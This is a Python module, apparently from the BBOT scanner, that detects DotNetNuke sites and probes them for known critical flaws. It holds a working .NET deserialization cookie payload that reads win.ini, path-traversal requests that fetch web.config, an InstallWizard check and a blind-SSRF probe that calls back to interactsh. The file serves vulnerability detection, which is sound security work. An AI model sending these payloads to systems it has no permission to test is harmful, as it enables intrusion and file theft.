from bbot.modules.base import BaseModule
from bbot.core.errors import InteractshError


class dotnetnuke(BaseModule):
    DNN_signatures_body = [
        "<!-- by DotNetNuke Corporation",
        "<!-- DNN Platform",
        "/js/dnncore.js",
        'content=",DotNetNuke,DNN',
        "dnn_ContentPane",
        'class="DnnModule"',
        "/Install/InstallWizard.aspx",
    ]
    DNN_signatures_header = ["DNNOutputCache", "X-Compressed-By: DotNetNuke"]
    exploit_probe = {
        "DNNPersonalization": r'<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'
    }

    watched_events = ["HTTP_RESPONSE"]
    produced_events = ["VULNERABILITY", "TECHNOLOGY"]
    flags = ["active", "aggressive", "web-thorough"]
    meta = {"description": "Scan for critical DotNetNuke (DNN) vulnerabilities"}

    async def setup(self):
        self.event_dict = {}
        self.interactsh_subdomain_tags = {}
        self.interactsh_instance = None

        if self.scan.config.get("interactsh_disable", False) == False:

            try:
                self.interactsh_instance = self.helpers.interactsh()
                self.interactsh_domain = await self.interactsh_instance.register(callback=self.interactsh_callback)
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")

        return True

    async def interactsh_callback(self, r):
        full_id = r.get("full-id", None)
        if full_id:
            if "." in full_id:
                event = self.interactsh_subdomain_tags.get(full_id.split(".")[0])
                if not event:
                    return
                await self.emit_event(
                    {
                        "severity": "MEDIUM",
                        "host": str(event.host),
                        "url": event.data["url"],
                        "description": f"DotNetNuke Blind-SSRF (CVE 2017-0929)",
                    },
                    "VULNERABILITY",
                    event,
                )
            else:
                # this is likely caused by something trying to resolve the base domain first and can be ignored
                self.debug("skipping result because subdomain tag was missing")

    async def handle_event(self, event):
        detected = False
        raw_headers = event.data.get("raw_header", None)

        if raw_headers:
            for header_signature in self.DNN_signatures_header:
                if header_signature in raw_headers:
                    await self.emit_event(
                        {"technology": "DotNetNuke", "url": event.data["url"], "host": str(event.host)},
                        "TECHNOLOGY",
                        event,
                    )
                    detected = True
                    break
        resp_body = event.data.get("body", None)
        if resp_body:
            for body_signature in self.DNN_signatures_body:
                if body_signature in resp_body:
                    await self.emit_event(
                        {"technology": "DotNetNuke", "url": event.data["url"], "host": str(event.host)},
                        "TECHNOLOGY",
                        event,
                    )
                    detected = True
                    break

        if detected == True:
            # DNNPersonalization Deserialization Detection
            for probe_url in [f'{event.data["url"]}/__', f'{event.data["url"]}/', f'{event.data["url"]}']:
                result = await self.helpers.request(probe_url, cookies=self.exploit_probe)
                if result:
                    if "for 16-bit app support" in result.text and "[extensions]" in result.text:
                        await self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": "DotNetNuke Personalization Cookie Deserialization",
                                "host": str(event.host),
                                "url": probe_url,
                            },
                            "VULNERABILITY",
                            event,
                        )

            if "endpoint" not in event.tags:

                # NewsArticlesSlider ImageHandler.ashx File Read
                result = await self.helpers.request(
                    f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx?img=~/web.config'
                )
                if result:
                    if "<configuration>" in result.text:
                        await self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": "DotNetNuke dnnUI_NewsArticlesSlider Module Arbitrary File Read",
                                "host": str(event.host),
                                "url": f'{event.data["url"]}/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx',
                            },
                            "VULNERABILITY",
                            event,
                        )

                # DNNArticle GetCSS.ashx File Read
                result = await self.helpers.request(
                    f'{event.data["url"]}/DesktopModules/DNNArticle/getcss.ashx?CP=%2fweb.config&smid=512&portalid=3'
                )
                if result:
                    if "<configuration>" in result.text:
                        await self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": "DotNetNuke DNNArticle Module GetCSS.ashx Arbitrary File Read",
                                "host": str(event.host),
                                "url": f'{event.data["url"]}/Desktopmodules/DNNArticle/GetCSS.ashx/?CP=%2fweb.config',
                            },
                            "VULNERABILITY",
                            event,
                        )

                # InstallWizard SuperUser Privilege Escalation
                result = await self.helpers.request(f'{event.data["url"]}/Install/InstallWizard.aspx')
                if result.status_code == 200:
                    result_confirm = await self.helpers.request(
                        f'{event.data["url"]}/Install/InstallWizard.aspx?__viewstate=1'
                    )
                    if result_confirm.status_code == 500:
                        await self.emit_event(
                            {
                                "severity": "CRITICAL",
                                "description": "DotNetNuke InstallWizard SuperUser Privilege Escalation",
                                "host": str(event.host),
                                "url": f'{event.data["url"]}/Install/InstallWizard.aspx',
                            },
                            "VULNERABILITY",
                            event,
                        )
                        return

                # DNNImageHandler.ashx Blind SSRF
                self.event_dict[event.data["url"]] = event
                if self.interactsh_instance:
                    subdomain_tag = self.helpers.rand_string(4, digits=False)
                    self.interactsh_subdomain_tags[subdomain_tag] = event

                    await self.helpers.request(
                        f'{event.data["url"]}/DnnImageHandler.ashx?mode=file&url=http://{subdomain_tag}.{self.interactsh_domain}'
                    )
                else:
                    self.debug(
                        "Aborting DNNImageHandler SSRF check due to interactsh global disable or interactsh setup failure"
                    )
                    return None

    async def cleanup(self):
        if self.interactsh_instance:
            try:
                await self.interactsh_instance.deregister()
                self.debug(
                    f"successfully deregistered interactsh session with correlation_id {self.interactsh_instance.correlation_id}"
                )
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")

    async def finish(self):
        if self.interactsh_instance:
            await self.helpers.sleep(5)
            try:
                for r in await self.interactsh_instance.poll():
                    await self.interactsh_callback(r)
            except InteractshError as e:
                self.debug(f"Error in interact.sh: {e}")
